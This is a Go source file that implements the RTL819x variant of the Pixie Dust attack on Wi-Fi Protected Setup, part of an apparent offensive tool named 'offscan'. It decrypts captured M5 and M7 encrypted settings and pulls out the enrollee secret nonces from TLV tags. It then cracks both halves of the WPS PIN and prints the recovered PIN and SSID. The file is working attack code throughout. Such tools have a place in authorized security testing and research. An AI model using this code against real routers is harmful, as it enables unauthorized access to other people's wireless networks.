/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"errors"
	"fmt"
	"offscan/internal/utils"
	"slices"
)



func (pda *pixieDustAttack) executeRTL819xCase() {
	if len(pda.m7enc) == 0 { return }
	pda.rtl819xReqFlags()
	pda.keyDerivationFunction()
	pda.decryptM7()
	pda.decryptM5()

	if pda.hasAllRTLdata() {
		pda.emptyPinHMAC()
		pda.findESecrets()
		pda.crackFirstHalf([]byte{})
		pda.crackSecondHalf()
	}

	pda.displayTime()
	pda.displaySSIDFromM7()
	pda.displayPIN()
}



func (pda *pixieDustAttack) rtl819xReqFlags() {
	if !slices.Contains(pda.modes, 3) { 
		utils.Abort("Mode 3 (RTL819x case) not selected")
	}
	
	if len(pda.rNonce) == 0 || len(pda.ebssid) == 0 {
		utils.Abort("Registrar Nonce (R-Nonce) and/or EBSSID not found")
	}

	if !pda.isRTL819xPKE() {
        utils.Abort("Model not supported! (PKE does not match RTL819x)")
    }
}



func (pda *pixieDustAttack) isRTL819xPKE() bool {
    return bytes.Equal(pda.pke, wpsRtlPke)
}



func (pda *pixieDustAttack) isGlibc() bool {
	return len(pda.eNonce) >= 16 && 
	       pda.eNonce[0] < 0x80 &&  
		   pda.eNonce[4] < 0x80 &&
           pda.eNonce[8] < 0x80 && 
		   pda.eNonce[12] < 0x80
}



func (pda *pixieDustAttack) decryptEncryptedSettings(encr []byte) []byte {
    const blockSize = 16

	if len(pda.wrapKey) != 16 {
	    utils.Abort("Error while decrypting (--m7enc/--m5enc). key must be 16 bytes for AES-128")
	}

	// AES-128-CBC
    if len(encr) < 2 * blockSize || len(encr) % blockSize != 0 {
        utils.Abort("Invalid encrypted data length")
    }

    iv         := encr[:blockSize]
    ciphertext := encr[blockSize:]

    block, err := aes.NewCipher(pda.wrapKey)
    if err != nil {
        utils.Abort(fmt.Sprintf("%v", err))
    }

    mode      := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(ciphertext))
	lenText   := len(plaintext)
    mode.CryptBlocks(plaintext, ciphertext)

    padLen := int(plaintext[lenText - 1])
    if padLen == 0 || padLen > lenText {
        utils.Abort("Invalid padding")
    }

    for i := lenText - padLen; i < lenText; i++ {
        if plaintext[i] != byte(padLen) {
            utils.Abort("Invalid padding")
        }
    }

    return plaintext[:lenText - padLen]
}


func (pda *pixieDustAttack) decryptM5() {
	pda.decrypted5 = pda.decryptEncryptedSettings(pda.m5enc)
	pda.m5enc      = nil
}



func (pda *pixieDustAttack) decryptM7() {
	pda.decrypted7 = pda.decryptEncryptedSettings(pda.m7enc)
	pda.m7enc      = nil
}



func findVTag(data []byte, targetID uint16, targetLen int) ([]byte, error) {
    for i := 0; i+4 <= len(data); {
        id     := binary.BigEndian.Uint16(data[i : i+2])
        length := int(binary.BigEndian.Uint16(data[i+2 : i+4]))

        if i+4+length > len(data) {
            return nil, errors.New("Invalid TLV: length exceeds buffer")
        }
        
        if id == targetID && (targetLen == 0 || length == targetLen) {
            return data[i+4 : i+4+length], nil
        }
        
        i += 4 + length
    }

    return nil, errors.New("Tag not found")
}



func (pda *pixieDustAttack) hasAllRTLdata() bool {
	ok := pda.decrypted5 != nil
	ok  = ok && pda.decrypted7 != nil
	ok  = ok && pda.eHash1 != nil
	ok  = ok && pda.eHash2 != nil
	
	return ok
}



func (pda *pixieDustAttack) findESecrets() {
	pda.eSecret1 = extractSecret(pda.decrypted5, 0x1016, "E-SNONCE 1")
	pda.eSecret2 = extractSecret(pda.decrypted7, 0x1017, "E-SNONCE 2")
}



func extractSecret(data []byte, tagID uint16, fieldName string) []byte {
    secret, err := findVTag(data, tagID, wpsNonceLen)

    if err != nil {
        utils.Abort(fmt.Sprintf("Tag %s not found in decrypted data: %v", fieldName, err))
    }

    return secret
}



func (pda *pixieDustAttack) displaySSIDFromM7() {
	ssidTag, err := findVTag(pda.decrypted7, 0x1045, 0)
	
	if err == nil {
	    ssid := string(ssidTag)
	    fmt.Printf("[*] SSID: %s\n", ssid)
	}
}